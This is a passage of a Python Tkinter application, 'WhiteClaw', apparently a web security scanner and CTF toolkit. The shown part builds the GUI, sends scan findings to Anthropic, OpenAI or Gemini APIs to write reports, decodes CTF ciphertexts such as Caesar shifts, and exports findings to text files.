4. **Medium & Low Findings** — Brief table: Finding | Severity | Quick Fix
5. **Attack Chains** — 1-3 realistic multi-step attack scenarios chaining findings.
6. **Remediation Roadmap** — Prioritised P1/P2/P3 list with estimated effort (hours).
7. **Compliance Notes** — OWASP Top 10, CWE IDs, GDPR/PCI-DSS touch points.

Be specific, technical, and actionable."""

    def generate(self, url: str, findings: dict) -> str:
        prompt = self._build_prompt(url, findings)

        if self.provider == "Claude (Anthropic)":
            if _anthropic_sdk is None:
                raise RuntimeError("anthropic package not installed. Run: pip install anthropic")
            client = _anthropic_sdk.Anthropic(api_key=self.api_key)
            msg = client.messages.create(
                model=self.model,
                max_tokens=8192,
                messages=[{"role": "user", "content": prompt}],
            )
            return msg.content[0].text

        elif self.provider == "GPT-4o (OpenAI)":
            if _openai_sdk is None:
                raise RuntimeError("openai package not installed. Run: pip install openai")
            client = _openai_sdk.OpenAI(api_key=self.api_key)
            resp = client.chat.completions.create(
                model=self.model,
                max_tokens=8192,
                messages=[{"role": "user", "content": prompt}],
            )
            return resp.choices[0].message.content

        elif self.provider == "Gemini (Google)":
            if _genai_sdk is None:
                raise RuntimeError("google-genai package not installed. "
                                   "Run: pip install google-genai")
            client = _genai_sdk.Client(api_key=self.api_key)
            resp = client.models.generate_content(
                model=self.model,
                contents=prompt,
            )
            return resp.text

        else:
            raise ValueError(f"Unknown provider: {self.provider}")


# ─────────────────────────────────────────────────────────────────────────────
# GUI
# ─────────────────────────────────────────────────────────────────────────────

class WhiteClawApp:
    TABS = [
        ("Vulnerabilities", "vulnerabilities"),
        ("APIs",            "apis"),
        ("Database",        "database"),
        ("CTF Artifacts",   "ctf"),
        ("CTF Solver",      "solver"),
        ("General Info",    "info"),
        ("AI Report",       "report"),
        ("Scan Log",        "log"),
    ]

    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title("WhiteClaw — Web Security Scanner & CTF Toolkit")
        self.root.geometry("1280x820")
        self.root.minsize(900, 600)
        self.root.configure(bg=BG)

        self._findings: dict = {}
        self._sev_counts: dict[str, int] = {s: 0 for s in SEV_COLOR}
        self._scan_url = ""

        self._build_styles()
        self._build_ui()

    # ── styles ────────────────────────────────────────────────────────────────

    def _build_styles(self) -> None:
        s = ttk.Style()
        s.theme_use("clam")
        s.configure("TFrame",  background=BG)
        s.configure("TLabel",  background=BG,  foreground=FG)
        s.configure("TButton", background=BG3, foreground=FG, borderwidth=0)
        s.map("TButton", background=[("active", BG4)])
        s.configure("TNotebook",     background=BG, borderwidth=0, tabmargins=0)
        s.configure("TNotebook.Tab", background=BG3, foreground=FG2,
                    padding=[14, 5], font=("Consolas", 15))
        s.map("TNotebook.Tab",
              background=[("selected", BG)],
              foreground=[("selected", BLUE)])
        s.configure("Horizontal.TProgressbar",
                    background=DARK_GRN, troughcolor=BG3, borderwidth=0, thickness=4)

    # ── UI construction ───────────────────────────────────────────────────────

    def _build_ui(self) -> None:
        self._build_header()
        self._build_toolbar()
        self._build_status_bar()
        self._build_notebook()

    def _build_header(self) -> None:
        bar = tk.Frame(self.root, bg=BG2, pady=10, padx=20)
        bar.pack(fill="x")

        tk.Label(bar, text="⬡ WhiteClaw", font=("Consolas", 28, "bold"),
                 fg=BLUE, bg=BG2).pack(side="left")
        tk.Label(bar, text="  Web Security Scanner & CTF Toolkit",
                 font=("Consolas", 17), fg=FG2, bg=BG2).pack(side="left", pady=2)
        tk.Label(bar, text="[ Authorized use only ]",
                 font=("Consolas", 15), fg=RED, bg=BG2).pack(side="right")

    def _build_toolbar(self) -> None:
        # ── Row 1: URL + scan/export buttons ──────────────────────────────────
        row1 = tk.Frame(self.root, bg=BG2, padx=20, pady=6)
        row1.pack(fill="x")

        tk.Label(row1, text="URL:", font=("Consolas", 16), fg=FG2, bg=BG2).pack(side="left")

        self._url_var = tk.StringVar()
        url_entry = tk.Entry(row1, textvariable=self._url_var, font=("Consolas", 17),
                             bg=BG3, fg=FG, insertbackground=BLUE,
                             relief="flat", bd=6, width=72)
        url_entry.pack(side="left", padx=8, ipady=3)
        url_entry.insert(0, "https://")
        url_entry.bind("<Return>", lambda _: self._start_scan())

        self._scan_btn = tk.Button(row1, text="  SCAN  ", font=("Consolas", 17, "bold"),
                                   bg=DARK_GRN, fg="white", activebackground="#2ea043",
                                   relief="flat", padx=12, pady=3,
                                   command=self._start_scan)
        self._scan_btn.pack(side="left", padx=4)

        self._export_btn = tk.Button(row1, text="Export Report",
                                     font=("Consolas", 16), bg=BG3, fg=FG2,
                                     activebackground=BG4, relief="flat",
                                     padx=10, pady=3,
                                     command=self._export_report,
                                     state="disabled")
        self._export_btn.pack(side="left", padx=4)

        self._export_all_btn = tk.Button(row1, text="Export All Findings",
                                         font=("Consolas", 16), bg=BG3, fg=FG2,
                                         activebackground=BG4, relief="flat",
                                         padx=10, pady=3,
                                         command=self._export_all_findings,
                                         state="disabled")
        self._export_all_btn.pack(side="left", padx=4)

        # ── Row 2: AI provider + model + API key ──────────────────────────────
        row2 = tk.Frame(self.root, bg=BG2, padx=20, pady=4)
        row2.pack(fill="x")

        tk.Label(row2, text="AI Provider:", font=("Consolas", 16),
                 fg=FG2, bg=BG2).pack(side="left")

        self._provider_var = tk.StringVar(value=list(PROVIDERS.keys())[0])
        provider_cb = ttk.Combobox(row2, textvariable=self._provider_var,
                                   values=list(PROVIDERS.keys()),
                                   state="readonly", width=20,
                                   font=("Consolas", 16))
        provider_cb.pack(side="left", padx=8, ipady=2)
        provider_cb.bind("<<ComboboxSelected>>", self._on_provider_change)

        tk.Label(row2, text="Model:", font=("Consolas", 16),
                 fg=FG2, bg=BG2).pack(side="left", padx=(4, 0))

        self._model_var = tk.StringVar(value=PROVIDERS[list(PROVIDERS.keys())[0]]["models"][0])
        self._model_cb = ttk.Combobox(row2, textvariable=self._model_var,
                                      values=PROVIDERS[list(PROVIDERS.keys())[0]]["models"],
                                      state="readonly", width=26,
                                      font=("Consolas", 16))
        self._model_cb.pack(side="left", padx=8, ipady=2)

        self._key_label = tk.Label(row2, text="API Key:", font=("Consolas", 16),
                                   fg=FG2, bg=BG2)
        self._key_label.pack(side="left", padx=(8, 0))

        self._key_var = tk.StringVar()
        self._key_hint_var = tk.StringVar(
            value=PROVIDERS[list(PROVIDERS.keys())[0]]["hint"])
        key_entry = tk.Entry(row2, textvariable=self._key_var, font=("Consolas", 17),
                             bg=BG3, fg=FG, insertbackground=BLUE,
                             relief="flat", bd=6, show="•", width=36)
        key_entry.pack(side="left", padx=8, ipady=3)

        self._key_hint = tk.Label(row2, textvariable=self._key_hint_var,
                                  font=("Consolas", 15), fg=BG4, bg=BG2)
        self._key_hint.pack(side="left")

    def _on_provider_change(self, _event=None) -> None:
        provider = self._provider_var.get()
        info = PROVIDERS.get(provider, {})
        models = info.get("models", [])
        self._model_cb.config(values=models)
        self._model_var.set(models[0] if models else "")
        self._key_hint_var.set(info.get("hint", ""))

    def _build_status_bar(self) -> None:
        bar = tk.Frame(self.root, bg=BG, padx=20)
        bar.pack(fill="x")

        self._status_var = tk.StringVar(value="Ready — paste a URL and press SCAN.")
        tk.Label(bar, textvariable=self._status_var, font=("Consolas", 15),
                 fg=FG2, bg=BG).pack(side="left", pady=3)

        self._progress = ttk.Progressbar(bar, style="Horizontal.TProgressbar",
                                          mode="indeterminate", length=180)
        self._progress.pack(side="right", pady=3)

        # Severity counters
        counter_bar = tk.Frame(self.root, bg=BG, padx=20, pady=2)
        counter_bar.pack(fill="x")
        self._counter_labels: dict[str, tk.Label] = {}
        for sev, color in SEV_COLOR.items():
            lbl = tk.Label(counter_bar, text=f"{sev}: 0",
                           font=("Consolas", 15, "bold"), fg=color, bg=BG)
            lbl.pack(side="left", padx=10)
            self._counter_labels[sev] = lbl

    def _build_notebook(self) -> None:
        self._nb = ttk.Notebook(self.root)
        self._nb.pack(fill="both", expand=True, padx=8, pady=6)

        self._text_areas: dict[str, scrolledtext.ScrolledText] = {}

        for tab_name, key in self.TABS:
            frame = tk.Frame(self._nb, bg=BG)
            self._nb.add(frame, text=f"  {tab_name}  ")

            if key == "solver":
                self._build_solver_tab(frame)
                continue

            if key == "report":
                btn_bar = tk.Frame(frame, bg=BG)
                btn_bar.pack(fill="x", padx=8, pady=4)
                self._gen_btn = tk.Button(
                    btn_bar, text=">> Generate AI Report",
                    font=("Consolas", 16, "bold"),
                    bg=PURPLE, fg="white", activebackground="#6e40c9",
                    relief="flat", padx=14, pady=4,
                    command=self._generate_ai_report,
                )
                self._gen_btn.pack(side="left")
                tk.Label(btn_bar,
                         text="  Requires a valid AI API key and a completed scan to form report.",
                         font=("Consolas", 15), fg=FG2, bg=BG).pack(side="left")

            ta = scrolledtext.ScrolledText(frame, bg=BG, fg=FG, font=("Consolas", 16),
                                           relief="flat", wrap="word",
                                           insertbackground="white", padx=6, pady=4)
            ta.pack(fill="both", expand=True, padx=4, pady=(0, 4))
            ta.config(state="disabled")
            self._text_areas[key] = ta

            # Colour tags
            ta.tag_configure("CRITICAL", foreground=RED,    font=("Consolas", 16, "bold"))
            ta.tag_configure("HIGH",     foreground=YELLOW, font=("Consolas", 16, "bold"))
            ta.tag_configure("MEDIUM",   foreground=BLUE)
            ta.tag_configure("LOW",      foreground=GREEN)
            ta.tag_configure("INFO",     foreground=FG2)
            ta.tag_configure("header",   foreground=FG,     font=("Consolas", 16, "bold"))
            ta.tag_configure("fix",      foreground="#3fb950")
            ta.tag_configure("sep",      foreground=BG4)
            ta.tag_configure("detail",   foreground=FG2)

    # ── scanning ──────────────────────────────────────────────────────────────

    def _start_scan(self) -> None:
        url = self._url_var.get().strip()
        if not url or url in ("https://", "http://", ""):
            messagebox.showwarning("Input required", "Please enter a target URL.")
            return
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            self._url_var.set(url)

        # Reset
        for ta in self._text_areas.values():
            ta.config(state="normal")
            ta.delete("1.0", "end")
            ta.config(state="disabled")

        self._findings = {}
        self._sev_counts = {s: 0 for s in SEV_COLOR}
        self._update_counters()
        self._export_btn.config(state="disabled")
        self._export_all_btn.config(state="disabled")
        self._scan_btn.config(state="disabled", text="SCANNING…")
        self._progress.start(12)
        self._scan_url = url

        self._log_to("log", "INFO",
                     f"WhiteClaw scan started: {url}",
                     datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

        threading.Thread(target=self._run_scan, args=(url,), daemon=True).start()

    def _run_scan(self, url: str) -> None:
        def cb(event_type: str, data):
            self.root.after(0, self._handle_event, event_type, data)

        WhiteClawScanner(url, cb).run()

    def _handle_event(self, event_type: str, data) -> None:
        if event_type == "status":
            self._status_var.set(data)
            self._log_to("log", "INFO", data)

        elif event_type == "finding":
            cat  = data.get("category", "info")
            sev  = data.get("severity", "INFO")
            titl = data.get("title", "")
            det  = data.get("detail", "")
            fix  = data.get("fix", "")

            tab = cat if cat in self._text_areas else "info"
            self._log_to(tab, sev, titl, det, fix)
            self._log_to("log", sev, f"[{cat.upper()}] {titl}")

            if sev in self._sev_counts:
                self._sev_counts[sev] += 1
                self._update_counters()

        elif event_type == "error":
            self._log_to("log", "HIGH", f"Error: {data}")

        elif event_type == "done":
            self._findings = data
            self._progress.stop()
            total = sum(self._sev_counts.values())
            self._scan_btn.config(state="normal", text="  SCAN  ")
            self._status_var.set(
                f"Scan complete — {total} finding(s)  "
                f"| CRIT {self._sev_counts['CRITICAL']} "
                f"| HIGH {self._sev_counts['HIGH']} "
                f"| MED {self._sev_counts['MEDIUM']}"
            )
            self._export_btn.config(state="normal")
            self._export_all_btn.config(state="normal")
            self._log_to("log", "INFO", "─" * 60)
            self._log_to("log", "INFO", "Scan complete. Switch to the AI Report tab and generate.")
            threading.Thread(
                target=self._save_reports,
                args=(self._scan_url, data),
                daemon=True,
            ).start()

    def _update_counters(self) -> None:
        for sev, lbl in self._counter_labels.items():
            lbl.config(text=f"{sev}: {self._sev_counts[sev]}")

    def _log_to(self, tab: str, sev: str, title: str,
                detail: str = "", fix: str = "") -> None:
        if tab not in self._text_areas:
            tab = "log"
        ta = self._text_areas[tab]
        ta.config(state="normal")
        ta.insert("end", "─" * 70 + "\n", "sep")
        ta.insert("end", f"[{sev}] {title}\n", sev)
        if detail:
            for line in detail.splitlines():
                ta.insert("end", f"  {line}\n", "detail")
        if fix:
            ta.insert("end", f"  ✔ FIX: {fix}\n", "fix")
        ta.insert("end", "\n")
        ta.see("end")
        ta.config(state="disabled")

    # ── AI report ────────────────────────────────────────────────────────────

    def _generate_ai_report(self) -> None:
        key      = self._key_var.get().strip()
        provider = self._provider_var.get()
        model    = self._model_var.get()

        if not key:
            messagebox.showwarning("API Key required",
                                   f"Paste your {provider} API key in the toolbar.")
            return
        if not self._findings:
            messagebox.showinfo("No scan data", "Run a scan first.")
            return

        ta = self._text_areas["report"]
        ta.config(state="normal")
        ta.delete("1.0", "end")
        ta.insert("end", f"Generating report via {provider} ({model})...\n", "INFO")
        ta.config(state="disabled")
        self._gen_btn.config(state="disabled", text="Generating...")

        def _work():
            try:
                reporter = AIReporter(provider, key, model)
                text = reporter.generate(self._scan_url, self._findings)
                self.root.after(0, self._show_report, text)
            except Exception as exc:
                self.root.after(0, self._show_report, f"Error: {exc}")

        threading.Thread(target=_work, daemon=True).start()

    def _show_report(self, text: str) -> None:
        ta = self._text_areas["report"]
        ta.config(state="normal")
        ta.delete("1.0", "end")
        ta.insert("end", text)
        ta.config(state="disabled")
        self._gen_btn.config(state="normal", text=">> Generate AI Report")
        # Switch to report tab
        for idx, (_, key) in enumerate(self.TABS):
            if key == "report":
                self._nb.select(idx)
                break

    # ── Report file system ────────────────────────────────────────────────────

    @staticmethod
    def _provider_name(url: str) -> str:
        """Extract a clean folder name from the URL domain.
        https://www.bolt.eu/app  →  bolt
        https://crypto.com/en   →  crypto
        """
        try:
            host = urllib.parse.urlparse(url).hostname or "unknown"
            host = re.sub(r'^www\.', '', host)
            name = host.split('.')[0]
            name = re.sub(r'[^\w\-]', '_', name)
            return name or "unknown"
        except Exception:
            return "unknown"

    def _save_reports(self, url: str, findings: dict) -> None:
        """Write one .txt file per finding + append a session block to scan_log.txt."""
        provider = self._provider_name(url)
        here     = Path(os.path.abspath(__file__)).parent
        rdir     = here / "reports" / provider
        rdir.mkdir(parents=True, exist_ok=True)

        now      = datetime.now()
        ts_file  = now.strftime("%Y%m%d_%H%M%S")
        ts_human = now.strftime("%Y-%m-%d %H:%M:%S")

        # Flatten all findings
        flat: list[dict] = []
        for items in findings.values():
            flat.extend(items)

        # ── one file per finding ───────────────────────────────────────────
        for idx, f in enumerate(flat, 1):
            sev      = f.get("severity", "INFO")
            title    = re.sub(r'[^\w\s\-]', '', f.get("title", "finding"))
            title    = re.sub(r'\s+', '_', title.strip())[:60]
            fname    = f"{ts_file}_{idx:03d}_{sev}_{title}.txt"
            fpath    = rdir / fname

            lines = [
                "WhiteClaw Finding Report",
                "=" * 50,
                f"Target   : {url}",
                f"Date     : {ts_human}",
                f"Severity : {sev}",
                f"Category : {f.get('category', '?')}",
                "",
                f"Finding  : {f.get('title', '')}",
                "",
            ]
            if f.get("detail"):
                lines += ["Detail:", f.get("detail", ""), ""]
            if f.get("fix"):
                lines += ["Remediation:", f.get("fix", ""), ""]

            fpath.write_text("\n".join(lines), encoding="utf-8")

        # ── append to scan_log.txt ─────────────────────────────────────────
        log_path = rdir / "scan_log.txt"
        sev_counts: dict[str, int] = {}
        for f in flat:
            s = f.get("severity", "INFO")
            sev_counts[s] = sev_counts.get(s, 0) + 1

        separator = "\n" + "=" * 60 + "\n"
        header = (
            f"SCAN SESSION — {ts_human}\n"
            f"Target : {url}\n"
            f"Total  : {len(flat)} finding(s)  "
            + "  ".join(f"{s}:{n}" for s, n in sorted(sev_counts.items()))
            + "\n"
        )
        body_lines = []
        for idx, f in enumerate(flat, 1):
            body_lines.append(
                f"  [{f.get('severity','?'):8}] {f.get('title','')}"
            )

        block = separator + header + "\n".join(body_lines) + "\n"

        with open(log_path, "a", encoding="utf-8") as lf:
            lf.write(block)

        self._log_to("log", "INFO",
                     f"Reports saved → reports/{provider}/  "
                     f"({len(flat)} files + scan_log.txt)")

    # ── CTF Solver tab ────────────────────────────────────────────────────────

    def _build_solver_tab(self, frame: tk.Frame) -> None:
        # ── input pane ────────────────────────────────────────────────────────
        tk.Label(frame,
                 text="INPUT — paste ciphertext / encoded data:",
                 font=("Consolas", 15), fg=FG2, bg=BG, anchor="w",
                 ).pack(fill="x", padx=8, pady=(6, 1))

        self._solver_input = scrolledtext.ScrolledText(
            frame, bg=BG3, fg=FG, font=("Consolas", 16),
            relief="flat", wrap="word", height=7,
            insertbackground=BLUE, padx=6, pady=4,
        )
        self._solver_input.pack(fill="x", padx=6, pady=(0, 4))

        # ── button / option row ───────────────────────────────────────────────
        btn_row = tk.Frame(frame, bg=BG)
        btn_row.pack(fill="x", padx=8, pady=(0, 4))

        self._solve_btn = tk.Button(
            btn_row, text="  AUTO-SOLVE  ",
            font=("Consolas", 16, "bold"),
            bg=PURPLE, fg="white", activebackground="#6e40c9",
            relief="flat", padx=14, pady=4,
            command=self._run_solver,
        )
        self._solve_btn.pack(side="left", padx=(0, 6))

        tk.Button(
            btn_row, text="Caesar table",
            font=("Consolas", 16), bg=BG3, fg=FG2,
            activebackground=BG4, relief="flat", padx=10, pady=4,
            command=self._show_caesar_table,
        ).pack(side="left", padx=(0, 6))

        tk.Button(
            btn_row, text="Clear",
            font=("Consolas", 16), bg=BG3, fg=FG2,
            activebackground=BG4, relief="flat", padx=10, pady=4,
            command=self._clear_solver,
        ).pack(side="left", padx=(0, 16))

        tk.Label(btn_row, text="Flag format (regex, optional):",
                 font=("Consolas", 15), fg=FG2, bg=BG).pack(side="left")

        self._flag_fmt_var = tk.StringVar()
        tk.Entry(
            btn_row, textvariable=self._flag_fmt_var,
            font=("Consolas", 16), bg=BG3, fg=FG,
            insertbackground=BLUE, relief="flat", bd=6, width=28,
        ).pack(side="left", padx=6, ipady=2)

        # ── separator ─────────────────────────────────────────────────────────
        tk.Frame(frame, bg=BG4, height=1).pack(fill="x", padx=6, pady=4)

        # ── results pane ──────────────────────────────────────────────────────
        tk.Label(frame, text="RESULTS:",
                 font=("Consolas", 15), fg=FG2, bg=BG, anchor="w",
                 ).pack(fill="x", padx=8, pady=(0, 2))

        self._solver_output = scrolledtext.ScrolledText(
            frame, bg=BG, fg=FG, font=("Consolas", 16),
            relief="flat", wrap="word",
            insertbackground="white", padx=6, pady=4,
        )
        self._solver_output.pack(fill="both", expand=True, padx=4, pady=(0, 4))
        self._solver_output.config(state="disabled")

        so = self._solver_output
        so.tag_configure("banner",  foreground=GREEN,  font=("Consolas", 18, "bold"), background=BG3)
        so.tag_configure("flag",    foreground=GREEN,  font=("Consolas", 16, "bold"))
        so.tag_configure("method",  foreground=BLUE,   font=("Consolas", 16, "bold"))
        so.tag_configure("step",    foreground=FG)
        so.tag_configure("attempt", foreground=FG2,    font=("Consolas", 15, "italic"))
        so.tag_configure("label",   foreground=FG2,    font=("Consolas", 15))
        so.tag_configure("error",   foreground=RED)
        so.tag_configure("sep",     foreground=BG4)
        so.tag_configure("caesar",  foreground=YELLOW, font=("Consolas", 15))
        so.tag_configure("hint",    foreground=PURPLE, font=("Consolas", 15, "italic"))

        tk.Label(frame,
                 text="Tip: WhiteClaw CTF Artifacts findings can be pasted directly here for decoding.",
                 font=("Consolas", 8), fg=BG4, bg=BG, anchor="w",
                 ).pack(fill="x", padx=8, pady=(0, 2))

    # ── solver execution ──────────────────────────────────────────────────────

    def _run_solver(self) -> None:
        text = self._solver_input.get("1.0", "end").strip()
        if not text:
            return

        self._solve_btn.config(state="disabled", text="Solving…")
        so = self._solver_output
        so.config(state="normal")
        so.delete("1.0", "end")
        so.insert("end", "Running auto-solve…\n", "label")
        so.config(state="disabled")

        fmt = self._flag_fmt_var.get().strip()

        def _work():
            engine = CTFSolverEngine()
            try:
                result = engine.solve(text, custom_flag_re=fmt)
            except Exception as exc:
                self.root.after(0, self._solver_show_error, str(exc))
                return
            self.root.after(0, self._solver_show_result, result)

        threading.Thread(target=_work, daemon=True).start()

    def _solver_show_error(self, msg: str) -> None:
        so = self._solver_output
        so.config(state="normal")
        so.delete("1.0", "end")
        so.insert("end", f"Error: {msg}\n", "error")
        so.config(state="disabled")
        self._solve_btn.config(state="normal", text="  AUTO-SOLVE  ")

    def _solver_show_result(self, result: dict) -> None:
        so = self._solver_output
        so.config(state="normal")
        so.delete("1.0", "end")

        chain    = result["chain"]
        flag     = result["flag"]
        solved   = result["solved"]
        attempts = result.get("all_attempts", [])

        # ── header ────────────────────────────────────────────────────────────
        if solved and flag:
            banner = f"  FLAG FOUND: {flag}  "
            so.insert("end", "═" * 62 + "\n", "sep")
            so.insert("end", banner.center(62) + "\n", "banner")
            so.insert("end", "═" * 62 + "\n\n", "sep")
        else:
            so.insert("end", "─" * 62 + "\n", "sep")
            so.insert("end", "  AUTO-SOLVE RESULTS\n", "method")
            so.insert("end", "─" * 62 + "\n\n", "sep")
            if not chain:
                so.insert("end", "No successful decoding found.\n\n", "error")
                so.insert("end", "Suggestions:\n", "label")
                so.insert("end",
                    "  • Paste just the encoded/ciphered portion, not surrounding text.\n"
                    "  • For XOR: input must be hex-encoded ciphertext.\n"
                    "  • For Vigenère or AES: manual key required — not yet auto-solved.\n"
                    "  • Try the 'Caesar table' button to inspect all 25 rotations.\n",
                    "hint")

        # ── solution chain ────────────────────────────────────────────────────
        if chain:
            so.insert("end", "Decode chain:\n\n", "label")
            for step in chain:
                n        = step["step"]
                method   = step["method"]
                inp      = step["input"]
                outp     = step["output"]
                is_flag  = step.get("is_flag", False)

                so.insert("end", f"  Step {n}: ", "label")
                so.insert("end", method + "\n", "method")
                so.insert("end", f"    Input  : {inp[:100]}\n", "step")
                so.insert("end",  "    Output : ", "step")
                so.insert("end", outp[:400] + "\n\n", "flag" if is_flag else "step")

        # ── all first-level attempts ──────────────────────────────────────────
        if attempts:
            so.insert("end", "─" * 62 + "\n", "sep")
            so.insert("end", "All first-level decode attempts:\n\n", "label")
            for method, preview in attempts:
                so.insert("end", f"  {method:<24}", "attempt")
                so.insert("end", f"→ {preview[:80]}\n", "step")

        so.config(state="disabled")
        so.see("1.0")
        self._solve_btn.config(state="normal", text="  AUTO-SOLVE  ")

    def _show_caesar_table(self) -> None:
        text = self._solver_input.get("1.0", "end").strip()
        if not text:
            return

        engine = CTFSolverEngine()
        rotations = engine.all_caesar_rotations(text)

        so = self._solver_output
        so.config(state="normal")
        so.delete("1.0", "end")
        so.insert("end", "─" * 62 + "\n", "sep")
        so.insert("end", "  CAESAR / ROT — ALL 25 ROTATIONS  (sorted by English score)\n", "method")
        so.insert("end", "─" * 62 + "\n\n", "sep")
        so.insert("end", f"  {'ROT':<6}{'Score':>7}   {'Preview (first 60 chars)'}\n", "label")
        so.insert("end", "  " + "-" * 58 + "\n", "sep")

        for shift, score, decoded in rotations:
            line = f"  ROT{shift:<3}  {score:>6.2f}   {decoded[:60]}\n"
            tag = "flag" if FLAG_RE.search(decoded) else "caesar"
            so.insert("end", line, tag)

        so.insert("end", "\n")
        so.config(state="disabled")
        so.see("1.0")

    def _clear_solver(self) -> None:
        self._solver_input.delete("1.0", "end")
        so = self._solver_output
        so.config(state="normal")
        so.delete("1.0", "end")
        so.config(state="disabled")

    # ── export ────────────────────────────────────────────────────────────────

    def _export_report(self) -> None:
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text file", "*.txt"), ("All files", "*.*")],
            title="Save WhiteClaw Report",
        )
        if not path:
            return

        with open(path, "w", encoding="utf-8") as f:
            f.write("WhiteClaw Security Report\n")
            f.write(f"Target : {self._scan_url}\n")
            f.write(f"Date   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 70 + "\n\n")
            for tab_name, key in self.TABS:
                content = self._text_areas[key].get("1.0", "end").strip()
                if content:
                    f.write(f"\n{'='*70}\n{tab_name.upper()}\n{'='*70}\n\n")
                    f.write(content + "\n")

        messagebox.showinfo("Exported", f"Report saved:\n{path}")

    def _export_all_findings(self) -> None:
        if not self._findings:
            messagebox.showinfo("No findings", "Run a scan first.")
            return

        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text file", "*.txt"), ("All files", "*.*")],
            title="Save All Findings — WhiteClaw",
        )
        if not path:
            return

        flat: list[dict] = []
        for items in self._findings.values():
            flat.extend(items)

        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        flat.sort(key=lambda f: sev_order.get(f.get("severity", "INFO"), 5))

        sev_counts: dict[str, int] = {}
        for f in flat:
            s = f.get("severity", "INFO")
            sev_counts[s] = sev_counts.get(s, 0) + 1

        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        lines = [
            "WhiteClaw — All Findings Report",
            "=" * 70,
            f"Target : {self._scan_url}",
            f"Date   : {now}",
            f"Total  : {len(flat)} finding(s)",
            "  " + "  ".join(
                f"{s}: {sev_counts[s]}"
                for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")
                if s in sev_counts
            ),
            "=" * 70,
            "",
        ]

        for idx, f in enumerate(flat, 1):
            lines += [
                f"Finding #{idx}",
                "-" * 50,
                f"Severity : {f.get('severity', '?')}",
                f"Category : {f.get('category', '?')}",
                f"Title    : {f.get('title', '')}",
                "",
            ]
            if f.get("detail"):
                lines += ["Detail:", f.get("detail", ""), ""]
            if f.get("fix"):
                lines += ["Remediation:", f.get("fix", ""), ""]
            lines.append("")

        with open(path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines))

        messagebox.showinfo("Exported", f"All {len(flat)} findings saved to:\n{path}")


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    root = tk.Tk()
    try:
        root.tk.call("tk", "scaling", 1.25)
    except Exception:
        pass
    WhiteClawApp(root)
    root.mainloop()
